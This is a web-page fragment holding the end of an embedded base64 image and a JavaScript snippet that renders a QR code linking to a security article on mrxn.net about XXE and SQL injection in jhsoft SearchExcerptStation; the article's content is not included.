/UmuH0PcXt3sZ/fPt8Oec/J9c1foXn7RfWg2hUmO9Ys75m+6zt71vfMX5+Q2VN7kb4txLfhCu+e0zk9ry52X97follePWivGC3VZ+l3THas7junY88540rvc8K3hfTmxV/zBA4LyZbO6leP56yrfnOib5lcdI78DM10NKvuPeSiOVHdfEd98x27LxfHeYeFGFr4mifw2wsZt5trvwzfkmhjqd/N2Wv+Dt7t8Sw933m/p32i+Y72qcs7Vw/+9kIyZNWfewJvtxDfuqsv0bfsDGe9Z9lo5vu9441lrqN9Yvc7f5Z7u4X0w//f+GEh4xsxXl89GLcumpeLzuzcvGhuxu0/Q3s69qy+er+nekf7er5zc/bLn+FhIc/Cy/v7T2BbiFu8wtmRfDvEWc75M1+95zr3PmfYZ5xlopkTvYeoLqZnrK7P+npOLtoX3BaiufC1T2At5LXP/3D3fwEAAP//6WLjngAAAAZJREFUAwDvUnS2PhdqlQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-SearchExcerptStation-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 